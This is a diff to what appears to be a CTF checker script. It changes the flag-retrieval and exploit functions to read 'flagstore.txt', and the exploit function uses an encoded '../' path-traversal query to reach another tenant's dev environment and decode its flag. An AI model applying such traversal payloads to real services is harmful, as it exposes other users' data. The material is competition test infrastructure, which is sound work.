@@ -27,6 +27,7 @@ from util import (
     create_devenv,
     devenv_websocket,
     do_create_devenv,
+    do_get_devenv_file_content,
     do_repl_auth,
     do_set_devenv_file_content,
     do_user_login,
@@ -276,14 +277,14 @@ async def getflag1(
     flag = (
         base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8").replace("+", "\\+")
     )
-    try:
-        await devenv_websocket(task.address, logger, cookies, devenvUuid, f".*{flag}.*")
-    except TimeoutError:
-        raise MumbleException("Flag was not found")
-    except ConnectionClosedError:
-        raise MumbleException("Connection was closed")
-    except InvalidStatusCode:
-        raise MumbleException("Invalid Status Code")
+
+    payload = await do_get_devenv_file_content(
+        client, logger, cookies, devenvUuid, "flagstore.txt"
+    )
+
+    match = re.match(f".*{flag}.*", payload, re.S)
+    if match is None:
+        raise MumbleException("Received unexpected input")
 
 
 @checker.exploit(1)
@@ -315,20 +316,18 @@ async def exploit1(
     )
 
     try:
-        response = await devenv_websocket(
-            task.address,
+        payload = await do_get_devenv_file_content(
+            client,
             logger,
             cookies,
             devenvUuid,
-            r"FLAG\s*([A-Za-z0-9\+\=\/]+)\s*OK",
+            "flagstore.txt",
             f"?uuid={devenvUuid}%2F..%2F{target_devenvUuid}",
         )
-        match = re.findall(r"FLAG\s*([A-Za-z0-9\+\=\/]+)\s*OK", response)
-        if len(match) == 0:
-            return None
-
-        flag = base64.b64decode(match[0]).decode("utf-8")
+        flag = base64.b64decode(payload).decode("utf-8")
         return flag
+    except AttributeError:
+        raise MumbleException("Invalid base64")
     except TimeoutError:
         raise MumbleException("Flag was not found")
     except ConnectionClosedError:
